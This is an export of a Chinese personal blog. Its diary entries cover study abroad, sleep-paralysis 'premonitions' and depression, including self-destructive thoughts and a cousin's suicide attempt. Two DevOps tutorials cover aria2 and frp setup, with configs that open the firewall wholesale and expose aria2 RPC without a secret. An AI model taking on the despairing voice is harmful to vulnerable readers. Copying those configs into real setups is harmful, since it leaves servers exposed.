<p>我已经分不太清这是梦还是真实发生的事情，我记得我有一天在qq上问她你喜欢过我么。</p>
<p>“真的要说么？” 她说，“应该是喜欢过的吧”</p>
<p>反正我当时不知道脑子抽了还是怎么回事，就回了句“那就这样吧”，就结束话题了。</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 2024 01 04</title>
    <url>/articles/diary/diary20240104/</url>
    <content><![CDATA[<p>draft</p>
<p>来讲讲我在国内读国际高中的事情。可能有些吧友对国际高中有点误解，认为里面都是群天天嗯开party的富家子弟。怎么说呢，这得看学校，也得看人。</p>
<p>首先是我读的那所国际高中，还是以升学率为目标的，也就是最后申请季的学生申请情况。所以老师也是相对严格一点，当然还是比不上国内普通高中的，毕竟能来上学的都是有点米的学生，自然也会有点闹腾的心。</p>
<p>&#x2F;&#x2F; 当然也有些打着“国际高中”，实际则为贵族学校的的高中，那个也许比较接近大伙的想象，但是我没去过我也不知道。</p>
<p>当然也得分人，大体可以分为两批人，一批想要申请顶尖大学的卷王，当然也有一批只有有学读就可以的。</p>
<p>再来说说课程，可能相比国内高中的深，我读的国际学校可能相对而言不是很深，但是比较宽。因为是在国内读的，我们必须在同时通过所有学考的情况下（关系到拿到高中毕业证），然后读一些大学课程 &#x2F;&#x2F; 我读的是AP</p>
<p>比如微积分啊，统计，大学化学，Java, 量子力学之类的东西。哦还有天杀的SAT和TOEFL</p>
<p>ok设定介绍完成</p>
<p>因为是国际学校，我们能掌控的自由相对而言还是比较多的。就比如，能带电脑上学。 &#x2F;&#x2F; 因为电脑要用于上课</p>
<p>鼠鼠因为失去了生活的目标，寻思着找个事情逃避现实，于是鼠鼠就开始自学编程，然后整天像个nerd一样对着计算机屏幕疯狂输出。</p>
<p>总之就是题目不会做了，生活中遇到烦心事了，ok，直接两而不闻窗外事，然后隔那恩敲代码，管他什么作业ddl，先等我写完代码再说。</p>
<p>当然副作用也是有的，鼠鼠的编程技能从0开始一路起飞，写了不少项目，包括博客啊啥的。甚至有一个小软件一度到达过用户量200+的成绩。</p>
<p>所以，理所应当的，鼠鼠把编程当初自己唯一的依靠，毕竟只有在这里，鼠鼠才能找到属于自己的存在感。</p>
<p>当然在高二开始申请大学的时候，我也是一门心思的往计算机比较好的大学申请。可惜由于当时情况特殊，美国的大学基本都把我给拒绝了（头铁直接嗯申计算机）。</p>
<p>最后还是加拿大的一所学校给了我offer。&#x2F;&#x2F; 别开我盒</p>
<p>然后鼠鼠就去了。</p>
<p>ok扯远了，下面正式进入留学生活。</p>
<p>由于毕业那年正好碰上疫情，给封在家里出不去了，鼠鼠又不想浪费一年时间搞那啥gap year，纯纯的浪费时间。</p>
<p>于是鼠鼠就开始日夜颠倒的上网课了，简单来说就是白天睡觉，晚上上课。</p>
<p>ok 第二年，鼠鼠就独自踏上了前往加麻大的留学生活。</p>
<p>怎么说呢，只能说空气相比国内确实要好很多，鼠鼠的鼻炎到这儿后就没有复发过了。</p>
<p>大二那年，鼠鼠和同学一起租了一个大house。当然不值鼠鼠一个人。房东把一整个别墅分成了好几个房间，分别租给不同的人，有点像群租房那种。算一算，那个大house里，地下一层住了五个人，第一层住了4个人，第二层住了4个，加起来十多个人。不过至少每个人都有单独的房间就是了。</p>
<p>当然租客也不止国人，也有本地人，当然也有印度人。</p>
<p>说说第一印象吧，当时那个印度租客怎么说呢，就是一股子咖喱味，又有点臭臭的，不是太好评价。然后他做菜做的确实是一拖糊糊，比如他有个常备的粉碎机，做菜时先把番茄啊，鸡蛋啊，黄油啊啥的，不管三七二十一先放进粉碎机里打碎，然后倒到锅里煮，煮完就嗯造。</p>
<p>然后本地人的印象就挺正常的了，有逆天的，也有非常正常好相处的人。</p>
<p>比如住在二楼的一个白人，姑且称呼为A。比较逆天的是他用锅做完菜之后从来都不洗。</p>
<p>我记得有一次A拿平底锅隔拿嗯煎鸡腿，重点是那个鸡腿还没有化冻，煎完之后他也不管熟没熟，直接就开始啃。啃完之后把锅一扔就不管它了。</p>
<p>到了第二天，他又下来做饭了，这次他拿着没洗过的锅，直接开始煎鸡蛋，我当时大为震撼。</p>
<p>说实在的，来加麻大前就知道这地方抽w33d的人挺多。但我确实没想到会这么多，有时候你走在路上，要是突然闻到一股令人恶心的臭味，那个就是有人刚刚飞过了。</p>
<p>再来说说治安，治安这东西，得看地区，最乱的地方就是市中心。白天倒是挺正常的，除了可以随时见到流浪汉之外也没啥好说的。</p>
<p>但是到了晚上，那就是整一个群魔乱舞。鼠鼠有一次和同学去市中心吃自助，吃完有点晚了。出来的第一感觉就是，我去好浓的w33d味，直接给我恶心坏了。</p>
<p>在走向公交车站的路上，随地可以看见周围吸嗨了的人，正在交易的流浪汉，还有拿着拐杖当长枪乱挥的，给我和同学看的一愣一愣的。</p>
<p>最离谱的时候，在路上突然窜出一个流浪汉，一边直接上手来扯我同学的外套，一边用及其诡异的姿势问我同学，“你这夹克衫哪里来的？”。</p>
<p>我和同学两大男人直接给吓傻了，我直接回了句“我们不说英文”，然后拉着我同学就一路跑到公交车站。直到上车才缓过气来。</p>
<p>以后我们就决定晚上再也不去downtown了，真的太危险了。</p>
<p>至于我们住的房子，还有学校，这个就属于“郊区了”，平常人都看不见一个，更别说流浪汉了。还是相对来说比较安全的，不过有了这次的经历，我俩晚上就再也没出去过。</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>日记 20240206</title>
    <url>/articles/diary/diary20240204/</url>
    <content><![CDATA[<p>五分真五分假，看个乐子</p>
<p>我小学开始，我就时不时的会被“鬼压床”，我不太好说这到底是不是鬼压床，因为他和平常大家描述的鬼压床不太一样。</p>
<p>而且每次出现的都是同一个效果。而且分阶段</p>
<p>这个“鬼压床”每次都发现在睡觉前。</p>
<p>第一阶段</p>
<p>在快要睡着的时候，身子会突然从后背开始发麻，然后逐渐蔓延到全身，接着四肢就动不了，即使意识非常清醒。后来，当这个征兆出现的时候，我就很明确清楚的意识到这事又来了，但是我没办法反抗，只能被拖入第二阶段。</p>
<p>第二阶段</p>
<p>紧接着，我耳朵会出现那种呓语。我不太好描述这个呓语，真要说可能是克苏卢那种不可名状，不可描述的感觉。感觉是一种带着有点疯狂的嘻笑，声音会逐渐增大直到充斥我整个脑海。同时会有一种无法用语言描述的恐惧感出现在心里。</p>
<p>第三阶段</p>
<p>等到那股笑声到达巅峰的时候，我感觉身下会出现一个黑洞一样的漩涡，会渐渐开始有一股力量撕扯着我把我往下拉。往下，往下一直往下。</p>
<p>每次出现这种情况的时候，我都会在疯狂的试图呼吸，说话，和睁开眼睛。然后，我也每次都能在第二阶段，或者第三阶段挣扎出来。</p>
<p>在我小学的时候，这种现象一般是一个月会出现1到二次。到了初中的时候，频率逐渐加多。到高一快结束的时候到达巅峰。那段时间，甚至是一周出现2,3次。有时甚至能连着出现两三天。</p>
<p>我也给我家里说过，带我看了医生也看不出个所以然，就说可能是身体比较虚吧。</p>
<p>总之，这样的现象，一直持续到那件事发生后，从那以后，我就再也没有遇到过相同的鬼压床了</p>
<p>大概是高一的下半学期。那天，因为我和家里大吵了一架，具体原因大概是考试没考好。我本就挺难受的，家里还要说我，我就挺难受的。总之一直吵到睡觉前，我父母还在那边唠叨。</p>
<p>那天好巧不巧，相同的鬼压床有出现了。与之前不同的是，这次我没有任何的反抗，想着要是这样意识消失了也不错，至少不需要在被学习什么烦恼了。</p>
<p>于是，我没有任何反抗的，被那个漩涡吸入。接着，我就失去意识了。</p>
<p>第二天，我正常的醒来。感觉似乎似乎一切都没有任何变化。似乎缺了什么，但我又说不出来。</p>
<p>当天在学校里，我一改往日行为，变得有点沉默寡言了。我同学都有点奇怪，为啥我突然不活跃了。我也不知道，只说被训了一顿，心情不太好。不过同学也都了解我，一般这种事我第二天醒来就忘记了。他们就当我遇到了别的什么事情，也没有多问&#x2F;</p>
<p>直到放学回家，我打开平板看点视频，动漫啥的。知道我打开一个视频，就是类似那种消防员冲进火场救人，狗狗救主人的那种类似的感人小视频的时候。</p>
<p>我突然意识到，我并不是心情不太好，而是我失去感情了。</p>
<p>这是一种很奇怪的感觉，我知道感情是什么，我甚至知道某些时刻我应该有什么感情，但是我就是感受不到任何感情。</p>
<p>任何喜怒哀乐，对于我来说仿佛就是一个概念，我知道它，我了解它。但是我和他就仿佛隔着一层玻璃，我碰不到她们。</p>
<p>我一部特别喜欢的动漫plastic memory（可塑性记忆），我刷了好几遍，里面很多情节我机会每一次刷都能有点那种泪目的感觉。</p>
<p>但是，当我再次重复观看这部动漫的时候，当我再次看到那些情节的时候，我很明确的意识到，我这里应该会被感动。但是我就是没有丝毫的情绪，非常奇怪。</p>
<p>说实话，这个虽然一开始对我有点影响，但是我很快就适应了。因为即使我感受不到情绪，但是我依旧知道某个时候应该有什么情绪，从而表演出来。</p>
<p>或许是有人从我这边取走了什么，同时也我留下了一点什么东西。我甚至不知道这两件事有没有关联。</p>
<p>我发现自己有了一点特殊的能力。我也不知道这到底是真的还是单纯是某些心理学现象。</p>
<p>就是，我会时不时的能感受到“神启”，我不太好描述这是一种什么能力。</p>
<p>我最早意识到我有这种能力，是在发生这件事之后的第三天，当时我和同学正偷偷用大屏幕看nba篮球直播。看着看着，我突然鬼使神差来了一句，“下一球，xxx会进三分。”我也不知道我为什么说出这句话，完全是我在无意识的情况下说出来的。紧接着，大约半分钟后，xxx果然进了三分。</p>
<p>我同学当时很惊讶，我也有点惊讶，但是更多的是一种“就是应该这样”的感觉。</p>
<p>这样的事情，在我失去感情之后就经常出现了。</p>
<p>这个能力，完全就是属于被动触发，触发条件是啥我完全不知道。但是发动的时候，我会完全不由自主的无意识的说出一句话，或者一段话。</p>
<p>这一段话，基本会在接下来的半小时内以某种方式实现，或者印证。</p>
<p>就在去年10月份的时候吧，我和同学在打英雄联盟。当时我和同学走下路。我在和同学一句一句有聊没聊的。</p>
<p>我印象非常深，我们刚刚和打野三包二把下路越了正在吃镀层，这个时候，对面重担在中路，打野和对面上路在打虫子。理论上没有任何人威胁到我们。</p>
<p>正吃着的时候，我也不知道我为什么，突然就说了一句“别死”。 我同学正疑惑呢，问我：“什么别死，对面人都不在我怎么死”</p>
<p>这个时候我不知道为什么，我大脑一片空白，跟卡壳了一样。<br>我在没有意识的情况下，似乎是以非常扭曲的声音喊了一声（据我同学描述）</p>
<p>“姐姐？”</p>
<p>我同学当时正疑惑是谁在说话，但因为当时discord里就我两个，他很快就确认了就是我在说话，因为除了我之外也没有其他人了。</p>
<p>他就问我，为什么突然喊了一声姐姐。我也说不上，我只告诉他我有一个比我大2,3岁的表姐，小时候对我非常好。我童年在外婆家的美好记忆至少有一半都是和她有关</p>
<p>但我表姐后来因为他父母离婚，爸爸赌博欠债跑路，生活弄得一团乱，我们家也尝试帮助过她们，但是和投进水里的石子一样。她们最后也有点不太好意思一直接受，所以最后也慢慢放弃了。</p>
<p>因为在打游戏么，我当时也没怎么在意，打了个哈哈就继续对线了。</p>
<p>但是，10分钟后，我妈妈突然给我打电话，告诉我了一个消息，我表姐试图在浴室里割腕自杀，刚刚抢救回来。人还昏迷着。</p>
<p>我只记得我当时没有任何惊讶，伤心，或者说任何情绪。感觉这一切都是理所当然会发生的，而我就是旁观者一样的感觉。</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 2023 12 09</title>
    <url>/articles/diary/diary20231209/</url>
    <content><![CDATA[<p>祝我生日快乐</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 2024 01 03</title>
    <url>/articles/diary/diary20240103/</url>
    <content><![CDATA[<p>怎么说呢，现在这个世界上真的好事没多少，坏事一件比一件多。那作为一个普通人，光是看到这些坏事就已经很无奈，很气愤了。要是一不小心代入了，直接能给我气到昏迷。</p>
<p>但是除了愤慨好像也啥事都做不了，就好似那个生气的河豚，给自己涨得圆滚滚的。却不知在人看是如此的可笑。</p>
<p>这时候就有人要说了，你觉得不好你就去改变它，你觉得不行你就去建设他。你不发动自己的主观能动性在这边说说有啥用处呢。说到底还是自己不够努力，改变不了，嘻嘻。</p>
<p>还真是，我就是废物。我没办法改变世界，甚至没办法改变他人，我唯一能够改变的就是自己。我唯一能做的就是让我至少在未来碰到这类事情的时候，我不会做出是他人受到伤害的决定。</p>
<p>除此之外，我们什么都改变不了。</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>日记 20240208</title>
    <url>/articles/diary/diary20240208/</url>
    <content><![CDATA[<p>看着四周热闹的人群，我不知道我在其中扮演着什么，我又在感受着什么。</p>
<p>我只是一味的堆砌起笑容，迎合着他人的不知道是真是假的笑容。</p>
<p>我仿佛不属于这个世界，周围的快乐，幸福与我无关。</p>
<p>坐在回宿舍的路上，突然有点想哭，但是我心里又对我这种想哭的感觉感到好笑。</p>
<p>哈哈，好似好似好似好似好似好似好似好似好似好似好似好似好似好似好似好似。</p>
<p>情绪是最没有意义的事情，我不知道我为什么会有这个想法。</p>
<p>也许是只有压抑住我的情绪，才能抑制住我逐渐增大的自我毁灭倾向。</p>
<p>你确实不配得到爱，你确实不配被爱。</p>
<p>回应我的只是心脏一阵又一阵的抽痛。</p>
<p>Ayankeya</p>
<p>2024.02.08 除夕夜</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>diary20240209</title>
    <url>/articles/diary/diary20240209/</url>
    <content><![CDATA[<p>翻来覆去睡不着觉，也没有心情敲代码，我就侧着身子躺在床上。</p>
<p>我划着朋友圈的年夜饭图片，划着社交媒体上各种人发着各种各样的庆祝新年的照片。</p>
<p>我看着某个游戏群的群友在那边相互臊皮，我也看着某个小说书友群的群友在那里相互祝贺新年。</p>
<p>我不知为何就哭了，我不知道我为什么在哭，眼泪他就自顾自的流了下来。</p>
<p>这好像是我自初中以来第一次哭。明明前几年也是一个人度过的，今年怎么就这么难熬呢。</p>
<p>我的心脏一抽一抽的，感觉有人在拉扯它一样，又酸又疼。我也不知道怎么才好，哈哈，也许这个时候猝死是一个不错的选择呢。</p>
<p>我站起来拉开窗帘，外面的天还是黑的。虽然国内也是黑的，但这个时候或许已经被烟花照亮了吧。</p>
<p>深呼吸，带起你的面具，藏好你的内心，今天还有课要上。</p>
<p>Aynakeya</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 20221001 - 2</title>
    <url>/articles/diary/ri-ji-20221002/</url>
    <content><![CDATA[<p>稍微写点流水账日记。</p>
<span id="more"></span>

<p>covid-19终于阴性了，下周开始可以去上课了，舒服了。但是这周落下的课程，很多都没有录像，光靠notes还是挺困难的，但总归还是大概或许也许可以跟上？</p>
<p>先是实习的面试，个人认为我和interviewer相谈甚欢，他提的问题我基本都能够回答，唯一不能确定的是我没有实习经历，不知道他们是怎么感觉的。</p>
<p>问题是，我发了这么多简历，现在给我面试机会的就一个啊，气死我了气死我了气死我了气死我了气死我了。</p>
<p>老毛病又开始犯了，每当快要睡着的时候，就会出现又哭又笑的幻听，这几次除了心悸和全身发麻之外还外加呼吸困难，真的有点快死了的感觉。</p>
<p>真不知道未来是啥</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>[日记] 20221012</title>
    <url>/articles/diary/ri-ji-20221012/</url>
    <content><![CDATA[<span id="more"></span>

<p>计算了一下，每天5公里的计划也快到一个月了。大概来说说感受吧。</p>
<p>我一开始跑步的目的是为了降低心率，开学的时候测了一下，发现坐着不动的时候的心率就有95-105了。如果再这样下去，迟早要寄，所以就打算开始跑步，把体质提一提。</p>
<p>但是很可惜的是，我的目的似乎没有达到，心率还是一样的高。。。</p>
<p>但是，就单纯跑5km来说，现在已经比刚刚开始轻松了不少，所以大概还是有作用的吧?</p>
]]></content>
      <categories>
        <category>Diary</category>
      </categories>
      <tags>
        <tag>日记</tag>
      </tags>
  </entry>
  <entry>
    <title>打开user lingering来运行服务 + 在linux上建立aria2c服务</title>
    <url>/articles/devops/enable-linux-user-lingering-for-service/</url>
    <content><![CDATA[<h1 id="概括"><a href="#概括" class="headerlink" title="概括"></a>概括</h1><p>最近在搞自己的小主机，在配置自己的<strong>aria2c</strong>服务的时候，发现aria2的服务时不时就会断掉,并报错<code>Emergency shutdown sequence commencing</code>。</p>
<p>本文介绍了如何修复这个问题，以及我的aria2服务配置</p>
<span id="more"></span>

<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p>因为想要aria2c以非root用户运行，我用 <code>systemctl --user start aria2.service</code>，这个时候服务正常启动，也不会结束。</p>
<p>但是，一旦我退出这个ssh session，过几秒之后aria2c就会自动停止。</p>
<p>重复几次试验后，确认了退出ssh session后，aria2c服务就会停止。</p>
<p>下面是报错的日志</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">2022-04-24 12:55:45.578362 [NOTICE] [HttpListenCommand.cc:108] IPv4 RPC: listening on TCP port 6800</span><br><span class="line">2022-04-24 12:55:45.578468 [NOTICE] [HttpListenCommand.cc:108] IPv6 RPC: listening on TCP port 6800</span><br><span class="line">2022-04-24 12:55:57.533186 [NOTICE] [DownloadEngine.cc:265] Emergency shutdown sequence commencing...</span><br></pre></td></tr></table></figure>

<h1 id="原因-解决方法"><a href="#原因-解决方法" class="headerlink" title="原因&amp;解决方法"></a>原因&amp;解决方法</h1><p>在进行了一定时间的互联网冲浪后，我在stackexchange上找到了解决方法: <a href="https://unix.stackexchange.com/questions/522545/systemd-shutting-down-when-terminal-is-closed">链接</a>.</p>
<p>原因是运行这个service的用户没有<code>user lingering</code>。</p>
<p>根据 <a href="https://www.freedesktop.org/software/systemd/man/loginctl.html">loginctl</a> 的 man page所说</p>
<blockquote>
<p>Enable&#x2F;disable user lingering for one or more users. If enabled for a specific user, a user manager is spawned for the user at boot and kept around after logouts. This allows users who are not logged in to run long-running services. </p>
</blockquote>
<p>简单来说，如果一个用户没有开启<code>user lingering</code>，他开启的service在这个用户登出之后就会自行结束。</p>
<p>所以，解决方法就是为运行这个service的用户开启<code>user lingering</code></p>
<p>我们可以用这个命令来打开</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo loginctl enable-linger aynakeya # enable user linger for aynakeya</span><br></pre></td></tr></table></figure>

<p>开启完毕后我们再次启动service，然后登出ssh session。发现这个时候aria2已经不会自动退出了。</p>
<h1 id="Aria2-As-Service"><a href="#Aria2-As-Service" class="headerlink" title="Aria2 As Service"></a>Aria2 As Service</h1><p>顺便贴一下aria2作为系统服务的配置。</p>
<p>安装好aria2后，把这个文件<code>aria2.service</code> 放到 <code>/etc/systemd/user/</code>目录下即可。</p>
<p>启动aria2的方式为:  <code>systemctl --user start aria2.service</code><br>关闭为: <code>systemctl --user stop aria2.service</code></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description=Aria2c As Service</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type=forking</span><br><span class="line">ExecStart=/usr/bin/aria2c -D --conf-path=/home/aynakeya/repo/aria2/aria2-daemon.conf</span><br><span class="line">WorkingDirectory=/home/aynakeya/repo/aria2</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy=default.target</span><br></pre></td></tr></table></figure>

<p><code>aria2-daemon.conf</code>的内容如下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># server config</span><br><span class="line">continue=true</span><br><span class="line"># run as service</span><br><span class="line">daemon=true</span><br><span class="line">#设置加密的密钥</span><br><span class="line">#rpc-secret=aaabbbccc</span><br><span class="line">#允许rpc</span><br><span class="line">enable-rpc=true</span><br><span class="line">#允许所有来源, web界面跨域权限需要</span><br><span class="line">rpc-allow-origin-all=true</span><br><span class="line">#允许外部访问，false的话只监听本地端口</span><br><span class="line">rpc-listen-all=true</span><br><span class="line">#RPC端口, 仅当默认端口被占用时修改</span><br><span class="line">#rpc-listen-port=6800</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># logging config</span><br><span class="line">log=/home/aynakeya/repo/aria2/log/aria2.log</span><br><span class="line">log-level=notice</span><br><span class="line"></span><br><span class="line"># download config</span><br><span class="line"></span><br><span class="line">#最大同时下载数(任务数), 路由建议值: 3</span><br><span class="line">max-concurrent-downloads=5</span><br><span class="line">#断点续传</span><br><span class="line">continue=true</span><br><span class="line">#同服务器连接数</span><br><span class="line">max-connection-per-server=5</span><br><span class="line">#最小文件分片大小, 下载线程数上限取决于能分出多少片, 对于小文件重要</span><br><span class="line">min-split-size=10M</span><br><span class="line">#单文件最大线程数, 路由建议值: 5</span><br><span class="line">split=10</span><br><span class="line">#下载速度限制</span><br><span class="line">max-overall-download-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-download-limit=0</span><br><span class="line">#上传速度限制</span><br><span class="line">max-overall-upload-limit=0</span><br><span class="line">#单文件速度限制</span><br><span class="line">max-upload-limit=0</span><br><span class="line">#断开速度过慢的连接</span><br><span class="line">#lowest-speed-limit=0</span><br><span class="line">#验证用，需要1.16.1之后的release版本</span><br><span class="line">#referer=*</span><br><span class="line">#文件保存路径, 默认为当前启动位置</span><br><span class="line">dir=/home/aynakeya/Downloads</span><br><span class="line">#文件缓存, 使用内置的文件缓存, 如果你不相信Linux内核文件缓存和磁盘内置缓存时使用, 需要1.16及以上版本</span><br><span class="line">#disk-cache=0</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>DevOps</category>
      </categories>
      <tags>
        <tag>linux</tag>
        <tag>aria2</tag>
        <tag>lingering</tag>
      </tags>
  </entry>
  <entry>
    <title>利用frp进行内网穿透，从外网访问内部服务器 (使用Oracle VM)</title>
    <url>/articles/devops/intranet-penetration-with-frp-and-oracle-vms/</url>
    <content><![CDATA[<h1 id="前言-简要介绍"><a href="#前言-简要介绍" class="headerlink" title="前言 &amp; 简要介绍"></a>前言 &amp; 简要介绍</h1><p>我为什么突然要搞一个内网穿透呢，因为oracle有一个免费的机器，放着也没用，不如整一个frp做内网穿透好了。</p>
<p>什么是内网穿透，简单来说就是你家里有一个服务器，开放了一些服务想要给外面的人用。但是你没有公网ip，所以外面访问不了。</p>
<p>这个时候，就需要内网穿透。通过一个有公网地址的服务器，把流量转发过来。</p>
<p>接下来就是我如何配置内网穿透的过程了。</p>
<span id="more"></span>

<h1 id="我的配置"><a href="#我的配置" class="headerlink" title="我的配置"></a>我的配置</h1><p>首先你得有一个具有公网ip的服务器，一个域名(如果你没有http的流量需要转发的话就不需要)。公网的服务器用来安装<code>frp</code>的服务器端，一个域名用来对不同的web服务进行转发。</p>
<p><code>frp</code>的代码开源在github<a href="https://github.com/fatedier/frp">frp</a>，文档在<a href="https://gofrp.org/docs/">文档</a>。最基本的安装教程以及配置都可以在这两个链接中找到。</p>
<h2 id="服务器设置（服务端）"><a href="#服务器设置（服务端）" class="headerlink" title="服务器设置（服务端）"></a>服务器设置（服务端）</h2><h3 id="安装-配置-frps"><a href="#安装-配置-frps" class="headerlink" title="安装&amp;配置 frps"></a>安装&amp;配置 frps</h3><p>首先在Github的<a href="https://github.com/fatedier/frp/releases">Release</a>页面中下载对应操作系统架构的可执行文件，然后解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf frp_0.44.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>打开<code>fprs.ini</code>，记住是<code>fprs.ini</code></p>
<p>修改内容为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">bind_port = 7000 # 这个是服务器的端口</span><br><span class="line">token=your_token # 改成你自己的token，随便取</span><br><span class="line"></span><br><span class="line">dashboard_port = 7500 # 这个是管理界面的端口</span><br><span class="line">dashboard_user = aynakeya # 这个是管理界面的账号</span><br><span class="line">dashboard_pwd = your_password # 这个是管理界面的密码</span><br><span class="line">enable_prometheus = true # 这个是开始管理界面</span><br><span class="line"></span><br><span class="line">subdomain_host = aa.xxxx.com # 这个是http服务的自定义二级域名</span><br><span class="line">vhost_http_port = 80 # 这个是http服务的端口，如果不需要转发http就不用写</span><br></pre></td></tr></table></figure>

<p>关于自定义二级域名的跟多信息可以看<a href="https://gofrp.org/docs/features/http-https/subdomain/">自定义二级域名</a></p>
<h3 id="将frps注册为系统服务并启动"><a href="#将frps注册为系统服务并启动" class="headerlink" title="将frps注册为系统服务并启动"></a>将frps注册为系统服务并启动</h3><p>创建<code>frps.service</code>文件</p>
<p>在<code>/etc/systemd/system/frps.service</code>中填上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line"># 服务名称，可自定义</span><br><span class="line">Description = frp server</span><br><span class="line">After = network.target syslog.target</span><br><span class="line">Wants = network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type = simple</span><br><span class="line"># 启动frps的命令，需修改为frps的安装路径</span><br><span class="line">ExecStart = /home/ubuntu/repo/frp/frps -c /home/ubuntu/repo/frp/frps.ini</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure>

<p>然后启动并查看服务状态</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start frps.service</span><br><span class="line">sudo systemctl status frps.service</span><br></pre></td></tr></table></figure>

<h3 id="打开允许程序通过服务器防火墙"><a href="#打开允许程序通过服务器防火墙" class="headerlink" title="打开允许程序通过服务器防火墙"></a>打开允许程序通过服务器防火墙</h3><p>这里以Oracle VM作为例子</p>
<p>打开Oracle VM Ubuntu系统instance的防火墙 <a href="https://jili.uk/2020/06/oracle-vm-%E5%BC%80%E6%94%BE-80-443-%E7%AB%AF%E5%8F%A3/">reference</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo iptables -P INPUT ACCEPT</span><br><span class="line">sudo iptables -P OUTPUT ACCEPT</span><br><span class="line">sudo iptables -P FORWARD ACCEPT</span><br><span class="line">sudo iptables -F</span><br></pre></td></tr></table></figure>

<p>找到Instance -&gt; subnet -&gt; security list -&gt; 选一个security list</p>
<p>在security list中添加规则 Ingress Rule，把管理端口，程序端口，以及你要映射的端口都加上</p>
<p><img data-src="/images/devops/Intranet-penetration-with-frp-and-oracle-VMs/2022-09-19_011448.png" alt="图片"></p>
<h2 id="客户端设置-frpc"><a href="#客户端设置-frpc" class="headerlink" title="客户端设置 frpc"></a>客户端设置 frpc</h2><h3 id="安装-配置-frpc"><a href="#安装-配置-frpc" class="headerlink" title="安装&amp;配置 frpc"></a>安装&amp;配置 frpc</h3><p>同样在Github的<a href="https://github.com/fatedier/frp/releases">Release</a>页面中下载对应操作系统架构的可执行文件，然后解压</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget https://github.com/fatedier/frp/releases/download/v0.44.0/frp_0.44.0_linux_amd64.tar.gz</span><br><span class="line"></span><br><span class="line">tar -zxvf frp_0.44.0_linux_amd64.tar.gz</span><br></pre></td></tr></table></figure>

<p>打开<code>fprc.ini</code>，这次是<code>fprc.ini</code></p>
<p>填入如下内容，更多功能可以参考<a href="https://gofrp.org/docs/features/">frp功能</a></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line">server_addr =  x.x.x.x # 服务器的地址</span><br><span class="line">server_port = 7000</span><br><span class="line">token=your_token  # 在服务器设置里填的token</span><br><span class="line"></span><br><span class="line">[frontpage]</span><br><span class="line">type = http </span><br><span class="line">local_ip = 127.0.0.1 # 本地的地址</span><br><span class="line">local_port = 80 # 本地的端口</span><br><span class="line">custom_domains = aa.xxxx.com # 用aa.xxxx.com访问</span><br><span class="line"></span><br><span class="line">[calibre]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 8020</span><br><span class="line"># 用calibre.&lt;subdomain_host&gt; 也就是 用calibre.aa.xxxx.com</span><br><span class="line">subdomain = calibre </span><br><span class="line"></span><br><span class="line">[jellyfin]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 8030</span><br><span class="line">subdomain = jellyfin</span><br><span class="line"></span><br><span class="line">[aria2web]</span><br><span class="line">type = http</span><br><span class="line">local_ip = 127.0.0.1</span><br><span class="line">local_port = 6801</span><br><span class="line">subdomain = aria2web</span><br></pre></td></tr></table></figure>

<h3 id="将frpc注册为系统服务并启动"><a href="#将frpc注册为系统服务并启动" class="headerlink" title="将frpc注册为系统服务并启动"></a>将frpc注册为系统服务并启动</h3><p>创建<code>frpc.service</code>文件</p>
<p>在<code>/etc/systemd/user/frps.service</code>中填上</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[Unit]</span><br><span class="line">Description = frp client</span><br><span class="line">After = network.target syslog.target</span><br><span class="line">Wants = network.target</span><br><span class="line"></span><br><span class="line">[Service]</span><br><span class="line">Type = simple</span><br><span class="line">ExecStart = /home/aynakeya/repo/frp/frpc -c /home/aynakeya/repo/frp/frpc.ini</span><br><span class="line"></span><br><span class="line">[Install]</span><br><span class="line">WantedBy = multi-user.target</span><br></pre></td></tr></table></figure>

<p>启动并检查</p>
